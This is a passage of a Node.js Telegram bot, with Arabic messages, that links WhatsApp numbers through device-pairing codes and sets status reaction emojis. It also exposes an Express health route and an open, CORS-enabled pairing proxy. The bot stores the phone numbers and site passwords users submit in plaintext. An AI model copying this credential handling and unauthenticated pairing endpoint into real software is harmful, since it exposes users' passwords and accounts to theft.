      await bot.sendMessage(chatId, adminStatusText());
      return;
    }

    if (name === "refresh_home") {
      clearUserFlow(session);
      await bot.sendMessage(chatId, renderStartMessage({
        isAdmin: isAdminFromUserId(userId),
        userId,
      }), {
        reply_markup: buildMainKeyboard({ isAdmin: isAdminFromUserId(userId) }),
      });
      return;
    }

    if (name === "my_linked_numbers") {
      await bot.sendMessage(chatId, buildLinkedSummary(userId), {
        reply_markup: buildOwnedNumbersKeyboard(userId),
      });
      return;
    }

    if (name === "unlink_number") {
      const ok = unlinkUserNumber(userId, value);
      await bot.sendMessage(
        chatId,
        ok ? `✅ تم فصل الرقم ${normalizePhoneNumber(value)}.` : "❌ تعذر فصل الرقم أو أنه غير مملوك لك.",
        { reply_markup: buildOwnedNumbersKeyboard(userId) }
      );
      return;
    }
  } catch (error) {
    await safeSendError(chatId, error);
  }
});

bot.on("message", async (msg) => {
  if (!msg?.text) return;
  if (/^\//.test(msg.text)) return;

  const chatId = msg.chat?.id;
  const userId = msg.from?.id;
  if (!chatId || !userId) return;

  try {
    registerUser(msg);
    const normalizedText = String(msg.text || "").trim();
    const textLower = normalizedText.toLowerCase();
    const session = getUserSession(userId);

    if (!(await ensureSubscription(msg))) {
      await promptForceSubscription(chatId);
      return;
    }

    if (session.awaitingPairNumber) {
      const pack = getPairLanguagePack(session.selectedPairLanguage || DEFAULT_PAIRING_LANGUAGE);
      const number = normalizePhoneNumber(normalizedText);
      if (!number) {
        await bot.sendMessage(chatId, pack.prompt);
        return;
      }
      session.awaitingPairNumber = false;
      await bot.sendMessage(chatId, pack.requesting);
      const result = await requestPairingCode(number);
      registerPendingPairing(userId, result.number, {
        pairing_code: result.code,
        pairing_code_sent_at: nowIso(),
        selected_language: session.selectedPairLanguage || DEFAULT_PAIRING_LANGUAGE,
      });
      updateNumberRecord(result.number, {
        telegram_user_id: Number(userId),
        last_pairing_code: result.code,
        last_pairing_code_at: nowIso(),
      });
      const replyText = buildWhatsappCommandReply(result.code);
      await bot.sendMessage(chatId, replyText, {
        parse_mode: "Markdown",
        reply_markup: buildMainKeyboard({ isAdmin: isAdminFromUserId(userId) }),
      });
      schedulePairingConfirmationPrompt(result.number, userId, 30);
      return;
    }

    if (session.awaitingEmojiCredentials) {
      const credentials = parseCredentialsMessage(normalizedText);
      if (!credentials) {
        await bot.sendMessage(chatId, "❌ الصيغة غير صحيحة. أرسل الرقم في سطر وكلمة المرور في السطر التالي.");
        return;
      }
      session.awaitingEmojiCredentials = false;
      updateNumberRecord(credentials.number, {
        telegram_user_id: Number(userId),
        site_password: credentials.password,
        sitePassword: credentials.password,
        updated_at: nowIso(),
      });
      await bot.sendMessage(
        chatId,
        `✅ تم حفظ بيانات الرقم ${credentials.number}.\nالآن أرسل رموز التفاعل التي تريدها أو استخدم زر تغيير رموز التفاعل.`,
        { reply_markup: buildMainKeyboard({ isAdmin: isAdminFromUserId(userId) }) }
      );
      return;
    }

    if (session.awaitingUserEmoji) {
      const emojis = splitEmojiInput(normalizedText);
      if (!emojis.length) {
        await bot.sendMessage(chatId, "❌ أرسل رمزًا واحدًا على الأقل.");
        return;
      }
      session.awaitingUserEmoji = false;
      state.userEmojiSettings[String(userId)] = {
        telegram_user_id: Number(userId),
        emoji: emojis[0],
        statusCustomReact: emojis.join(","),
        updated_at: nowIso(),
      };
      saveUserEmojiSettings();
      await bot.sendMessage(chatId, `✅ تم حفظ رموز التفاعل: ${emojis.join(" ")}`, {
        reply_markup: buildMainKeyboard({ isAdmin: isAdminFromUserId(userId) }),
      });
      return;
    }

    if (session.awaitingDrfCredentials) {
      const credentials = parseCredentialsMessage(normalizedText);
      if (!credentials) {
        await bot.sendMessage(chatId, "❌ أرسل الرقم وكلمة المرور في رسالة واحدة أو سطرين.");
        return;
      }
      session.awaitingDrfCredentials = false;
      updateNumberRecord(credentials.number, {
        telegram_user_id: Number(userId),
        site_password: credentials.password,
        sitePassword: credentials.password,
        drf_manual_login_saved_at: nowIso(),
      });
      await bot.sendMessage(chatId, `✅ تم حفظ بيانات /drf للرقم ${credentials.number}.`);
      return;
    }

    if (USER_EMOJI_TRIGGERS.has(normalizedText)) {
      clearUserFlow(session);
      session.awaitingEmojiCredentials = true;
      await bot.sendMessage(
        chatId,
        "هلا عزيزي لتغير رمز الحاله ارسل رقمك + الباسورد بالطريقه التاليه 👇\n967773987296\n1234567"
      );
      return;
    }

    if (DRF_TEXT_TRIGGERS.has(textLower)) {
      if (!isAdminFromUserId(userId)) {
        await bot.sendMessage(chatId, "🔒 تم إخفاء وقفل الدخول لإعدادات الرقم من الواجهة.");
        return;
      }
      clearUserFlow(session);
      session.awaitingDrfCredentials = true;
      await bot.sendMessage(chatId, "أرسل الرقم وكلمة المرور لواجهة /drf.", {
        reply_markup: buildPairLanguageKeyboard("drf"),
      });
      return;
    }

    if (normalizedText === PASSWORD_DISCOVERY_COMMAND) {
      state.autoReplyLog[String(userId)] = {
        user_id: Number(userId),
        requested_at: nowIso(),
        wait_seconds: PASSWORD_DISCOVERY_RESPONSE_WAIT_SECONDS,
      };
      saveAutoReplyLog();
      await bot.sendMessage(chatId, "ℹ️ تم تسجيل طلبك. أرسل الرقم مع كلمة المرور عندما تصلك.");
      return;
    }
  } catch (error) {
    await safeSendError(chatId, error);
  }
});

async function safeSendError(chatId, error) {
  const message = String(error?.message || error || "Unknown error");
  console.error("Bot error:", message);
  if (!chatId) return;
  try {
    await bot.sendMessage(chatId, `❌ ${message}`);
  } catch (sendError) {
    console.error("Failed to send error message:", sendError.message);
  }
}

const app = express();
app.use(cors());
app.use(express.json({ limit: "1mb" }));

app.get("/health", (_req, res) => {
  res.json({
    ok: true,
    service: "telegram-whatsapp-bot",
    now: nowIso(),
    env: fs.existsSync(ENV_PATH),
    users: Object.keys(state.users).length,
    linked_numbers: Object.keys(state.linkedWhatsappUsers).length,
  });
});

app.get("/", (_req, res) => {
  res.type("text/plain; charset=utf-8").send("Telegram + WhatsApp bot is running.");
});

app.all("/api/pairing", async (req, res) => {
  try {
    const phone = normalizePhoneNumber(
      req.method === "POST"
        ? req.body?.num || req.body?.phone || req.body?.number || req.body?.phoneNumber
        : req.query?.num || req.query?.phone || req.query?.number || req.query?.phoneNumber
    );
    if (!phone) {
      res.status(400).json({ error: "أدخل الرقم أولاً" });
      return;
    }

    if (!PAIRING_API_URL || PAIRING_API_URL === `${req.protocol}://${req.get("host")}/api/pairing`) {
      res.status(400).json({ error: "PAIRING_API_URL is not configured for upstream forwarding." });
      return;
    }

    const upstream = await axios.post(
      PAIRING_API_URL,
      { num: phone, number: phone, phone: phone, phoneNumber: phone },
      {
        timeout: 30000,
        headers: { "Content-Type": "application/json" },
        validateStatus: () => true,
      }
    );

    res.status(upstream.status).json(upstream.data);
  } catch (error) {
    res.status(500).json({ error: error.message || "فشل توليد الكود، حاول مجددًا" });
  }
});

let server;

async function start() {
  loadState();
  saveSettings();
  state.botInfo = await bot.getMe();
  console.log(`Starting bot @${state.botInfo.username || "unknown"}`);
  await bot.startPolling();
  server = app.listen(HEALTH_PORT, "0.0.0.0", () => {
    console.log(`Health/API server running on ${HEALTH_PORT}`);
  });
}

async function shutdown(signal) {
  console.log(`Received ${signal}. Shutting down...`);
  for (const timer of state.backgroundTimers.values()) {
    clearTimeout(timer);
  }
  state.backgroundTimers.clear();
  try {
    await bot.stopPolling();
  } catch (error) {
    console.error("Failed to stop polling:", error.message);
  }
  if (server) {
    await new Promise((resolve) => server.close(resolve));
  }
  process.exit(0);
}

process.on("SIGINT", () => void shutdown("SIGINT"));
process.on("SIGTERM", () => void shutdown("SIGTERM"));

start().catch((error) => {
  console.error("Fatal startup error:", error);
  process.exit(1);
});
